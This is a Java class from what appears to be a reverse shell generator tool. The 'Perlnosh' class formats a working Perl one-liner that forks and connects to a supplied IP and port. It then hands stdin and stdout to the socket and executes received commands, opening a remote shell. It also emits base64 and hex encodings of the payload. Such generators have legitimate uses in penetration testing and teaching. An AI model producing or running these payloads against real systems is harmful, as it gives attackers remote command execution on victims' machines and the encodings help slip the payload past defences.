package com.iteso.ReverseShellGenerator.Reverse.Shells;
import com.iteso.ReverseShellGenerator.DEncoder;
import com.iteso.ReverseShellGenerator.Reverse.Reverse;

public class Perlnosh extends Reverse {

    protected String shellFormat = "";

    public Perlnosh(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\\\"%s:%s\\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",this.getLocalIP(), this.getLocalPort());
    }

    @Override
    public String getShellCode(){
        return shellFormat;
    }

    @Override
    public String toString(){
        return "{" + "\"parameters\": " + super.toString() + "," +
                    "\"reverse_listener_code\": " + "\"" + super.getListenerCode() + "\"," +
                    "\"reverse_shell_code\": " + "\"" + getShellCode() + "\"," +
                    "\"reverse_shell_code_b64\": " + "\"" + DEncoder.encodeToBase64(getShellCode()) + "\"," +
                    "\"reverse_shell_code_hex\": " + "\"" + DEncoder.encodeToHex(getShellCode()) + "\"" +
                "}";
    }
    
} 
    